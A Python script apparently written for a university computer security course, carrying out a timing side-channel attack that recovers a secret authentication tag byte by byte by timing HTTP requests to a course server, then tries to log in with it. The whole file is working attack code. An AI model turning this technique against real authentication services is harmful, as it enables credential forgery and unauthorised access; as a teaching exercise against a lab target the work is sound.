# MADE BY: 
# Christoffer Sundqvist 
# FOR: 
# computer security I at Karlstad University

import requests
import time

# The delay that the server has (50 = 0,05 and 100 = 0,1)
delay = 0.01
# the delay between the client and server (my delay from home on average is 0.04658337593078613 and lowest = 0.0421 from my program cmpMed.py)
# bare in mind that the padding cannot be the same or higher than the delay because the program must be able to 
# notice the difference between longer network delay and server delays.
# values i know work from home are delay = 50 in url and 0,05 in delay variable and delayThreshhold = 0,05 (takes about 15 min)
padding = delay/3
avgNetDelay = 0
delayThreshhold = 0

URL = "http://130.243.27.198/auth/"+ str(int(delay*1000))+"/chrisun106/"
location = "Karlstad University"
PARAMS = {'adress':location}
tagPointer = 0
firstHexa = 0
secondHexa = 0
tagList = [1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
newURL = None
timelist = []
networkTimeList = []
found = None

# Updates the tagListString before a new request is sent to the server
def UpdateURL():
	tagListString = ''.join(str(x) for x in tagList)
	print(tagListString)
	global newURL
	newURL = URL + tagListString

# Times requests and if they go over the predicted threshhold.
# If it goes over see if it does so numberOfRequestTries, if it does assume that it is the wanted subtag.
# If the time is too low skip the current subtag since it cannot possibly be it.
def SetNetworkTimeList():
	numberOfRequestTries = 8
	while numberOfRequestTries > 0:
		startTime = time.time()
		r = requests.get(url = newURL, params = PARAMS)
		endTime = time.time()
		networkTimeList.append(endTime-startTime)
		if endTime-startTime > delayThreshhold :
			print("THIS IS A CANDIDATE")
			if numberOfRequestTries < 2 :
				global found
				found = 1
				return
		else :
			numberOfRequestTries = -1
			return
		numberOfRequestTries = numberOfRequestTries -1
	return

# Search the current networkTimeList to find the highest delay and append it to the timelist
def GetConnectionWithHighestDelay():
	highestDelay = 0
	for x in networkTimeList:
		if x > highestDelay:
			highestDelay = x
	timelist.append(highestDelay)
	
# Function calls and clears the networkTimeList after checking each subtag.
def SendToServer():
	SetNetworkTimeList()
	GetConnectionWithHighestDelay()
	networkTimeList.clear()

# Updates the taglist, listPlace = at what tagListindex to change, indexx = what to change to.
def UpdateTagList(listPlace, indexx):
	if indexx == -1:
		tagList[listPlace] = "E"
		return
	if indexx < 10 :
		tagList[listPlace] = indexx
		return
	if indexx > 9:
		if indexx == 15 :
			tagList[listPlace] = "F"
			return
		if indexx == 14 :
			tagList[listPlace] = "E"
			return
		if indexx == 13 :
			tagList[listPlace] = "D"
			return
		if indexx == 12 :
			tagList[listPlace] = "C"
			return
		if indexx == 11 :
			tagList[listPlace] = "B"
			return
		if indexx == 10 :
			tagList[listPlace] = "A"
			return
	
# Runs at the end of program to try and log in with found credentials.
def TryLogin():
	UpdateURL()
	startTime = time.time()
	r = requests.get(url = newURL, params = PARAMS)
	endTime = time.time()
	print(r)
	print(newURL)
	print(endTime-startTime)

def GetAvg():
	timer = 0
	localList = []
	print("Getting average network delay from you to server...")
	while timer < 100:
		URL = "http://130.243.27.198/auth/50/chrisun106/00000000000000000000000000000000"
		startTime = time.time()
		r = requests.get(url = URL, params = PARAMS)
		endTime = time.time()
		localList.append(endTime-startTime)
		timer = timer +1
	global avgNetDelay 
	avgNetDelay = (sum(localList)/len(localList))
	print("Your average network delay is: "+ str(avgNetDelay))
	time.sleep(2)
	
def main():
	global tagPointer
	global firstHexa
	global secondHexa
	global delayThreshhold
	global found
	GetAvg()
	delayThreshhold = avgNetDelay + padding
	while tagPointer < 32:
		found = 0
		while found < 1:
			timelist.clear()
			firstHexa = 0
			while firstHexa < 16 :
				if found < 1 :
					UpdateTagList(tagPointer, firstHexa)
					secondHexa = 0
					while secondHexa < 16 :
						if found < 1 :
							UpdateURL()
							SendToServer()
							if found < 1 :
								UpdateTagList(tagPointer+1, secondHexa)
							else : 
								secondHexa = 16 
						secondHexa = secondHexa + 1
				else :
					firstHexa = 16
				firstHexa = firstHexa + 1 
		delayThreshhold = delayThreshhold + delay
		print(delayThreshhold)
		tagPointer = tagPointer + 2
	TryLogin()
	time.sleep(6)

main()
			
			

